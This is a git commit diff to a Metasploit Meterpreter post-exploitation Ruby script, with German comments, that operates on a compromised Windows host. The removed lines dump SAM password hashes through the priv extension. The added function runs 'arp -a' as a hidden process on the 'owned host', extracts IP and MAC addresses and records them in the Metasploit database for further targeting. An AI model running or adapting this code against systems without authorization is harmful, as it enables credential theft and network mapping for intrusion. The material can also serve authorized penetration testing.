a89d6c15e3cf416d8fa8d8331dd0cd8e3766a517
Kuwe <kuwe@ubuntu.ubuntu-domain>
2010-12-03 13:08:36 +0100

    Erste funktionierende Funktion

--- script/reconnaissance/reconnaissance.rb
+++ script/reconnaissance/reconnaissance.rb
@@ -1,46 +1,41 @@
-require 'camof'
-
-#ENV[:BASE] = "/home/nox/apps/"
-
-require 'winenum'
-
-# if session.framework.db.active
-   #   session.framework.db.report_host(
-   #     :workspace => session.framework.db.workspace,
-   #     :host => "ip_text",
-   #     :mac  => "asdasd"
-   #   )
-   #   session.framework.db 
-   # end
-      
-
-#require 'pp' 
-#require "#{ENV[:BASE]}/home/nox/apps/msf3/scripts/meterpreter/winenum"
-#client.run_cmd("run migrateToExplorerExe.rb")
-#client.run_cmd("run winenum")
-
-infos = {}
-
-hashes = {}
-infos[:hashes] =  hashes
-
-module Reconnaissance
-    def gethash() 
-        begin
-            hash = ''
-            @client.core.use("priv")
-            hashes = @client.priv.sam_hashes
-            hashes.each do |h|
-                printf "## "
-                printf h.to_s.regex + "\n"
-                hash << h.to_s+"\n"
-            end
-            hash << "\n\n\n"
-        rescue ::Exception => e
-            puts "verdammt"
-        end
-        puts hashes
-    end
+#-------------------------------------------------------------------------------
+# Function for running arp -a on the owned host
+def list_arp_a()
+	a =[]
+	@client.response_timeout=120
+	cmd = "arp -a"
+	a.push(::Thread.new {
+		r,cmdout='',""	
+		print_status "\trunning command #{cmd}"
+		r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
+		while(d = r.channel.read)
+			# Überprüfen von jeder Zeile die wir von der Windows cmd bekommen. Ip-Adressen auslesen, sowie die MAC-Adresse
+			cmdout << d
+		end
+		# durch die Ausgabe iterieren und nach IP-Adressen und MAC-Adressen suchen
+		cmdout.split("\n").each do |line|
+			# herausfiltern einer IP-Adresse aus einer Zeile
+			b = line.scan(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
+			# herausfiltern der dazugehörigen MAC-Adresse
+			c = line.scan(/\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}\-\S{1,2}/)
+			# Schreiben der gefundenen IP- und MAC-Adressen in die Datenbank
+			if not b.empty? and not c.empty?
+				if session.framework.db.active
+					session.framework.db.report_host(
+					:workspace => session.framework.db.workspace,
+					:host => b.first.to_s,
+					:mac  => c.first.to_s
+					) 			
+				end
+			end
+		end
+			
+		cmdout = ""
+		r.channel.close
+		r.close
+		})
+	a.delete_if {|x| not x.alive?} while not a.empty?
 end
 
-gethash()
+list_arp_a()
+
